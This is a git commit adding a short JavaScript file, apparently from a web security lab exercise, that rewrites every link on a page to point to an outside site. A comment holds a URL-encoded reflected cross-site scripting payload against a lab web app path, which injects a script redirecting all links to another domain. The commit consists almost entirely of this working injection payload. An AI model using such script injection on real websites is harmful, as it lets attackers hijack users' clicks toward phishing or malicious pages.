a99262ce714a423394f2977f1859a8bee06783f6
Jimmy Basiluk <vasilukwolf@gmail.com>
2020-02-16 12:53:53 -0500

    change me

---
+++ replaceLinks.js
@@ -0,0 +1,10 @@
+var a = document.getElementsByTagName("a");
+  for(i=0; i< a.length;i++){
+    a[i].setAttribute('href', 'http://aim.com');
+    a[i].innerHTML = 'Link modified';
+  }
+
+//  http://lab.app.com/lab/webapp/jfp/1?url=%3Cscript%20type%3D%22text%2Fjavascript%22%3E%0A%20%20a%20%3D%20document.
+// querySelectorAll(%27a%27)%3B%0A%20%20i%20%3D%20null%3B%0A%20%20for(i%3D0%3B%20i%3Ca.
+// length%3Bi%2B%2B)%7B%0A%20%20%20%20console.log(a%5Bi%5D)%3B%0A%20%20%20%20a%5Bi%5D.
+// setAttribute(%27href%27%2C%20%27http%3A%2F%2Fwob.su%27)%3B%0A%20%20%7D%0A%3C%2Fscript%3E%0A
